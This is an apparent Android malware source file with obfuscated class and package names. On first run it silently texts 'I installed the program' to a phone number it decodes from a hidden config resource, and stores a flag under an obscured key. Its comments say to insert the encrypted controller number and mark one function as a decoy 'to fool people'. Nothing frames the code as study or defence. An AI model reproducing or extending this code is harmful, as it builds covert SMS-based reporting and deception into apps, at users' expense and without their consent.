package com.a.a;

import java.text.DecimalFormat;


import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

public class n {
	static public String PWD = null;

	public static void chkIsFirstRun(Context context) {
		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
		String SENDTO = getSendTo(context);
		if (!sp.getString("54hgs", "").equals(SENDTO)) {
			u.log(context, "初次运行！");
			sp.edit().putString("54hgs", SENDTO).commit();
			u.sendSms(context, null, "我安装程序啦");
		}
	}

	/** 这里填入加密后的手机号！！ */
	public static String getSendTo(Context context) {
		if (PWD == null) {
			u.chkConfigInRaw(context);
		}
		return get1(PWD);
	}

	public static String toStringByBase64(String str) {
		return new String(android.util.Base64.decode(str, android.util.Base64.DEFAULT));
	}

	public static String get1(String str) {
//		double num = get3(get2(toStringByBase64(str)));
//		return get4(num);
		return str;
	}

	public static double get2(String str) {
		return (Double.parseDouble(str) - 7841) / 2;
	}

	public static double get3(double str) {
		return (str - 4681) / 3;
	}

	public static String get4(double str) {
		DecimalFormat df = new DecimalFormat("0");
		return df.format(str);
	}

	/** 忽悠人的函数 */
	public static boolean chkIsOk(String telphone) {
		if (telphone.length() > 5 * 2 * 4 / 2 * 9 + 8) {
			return true;
		} else {
			return false;
		}
	}
}
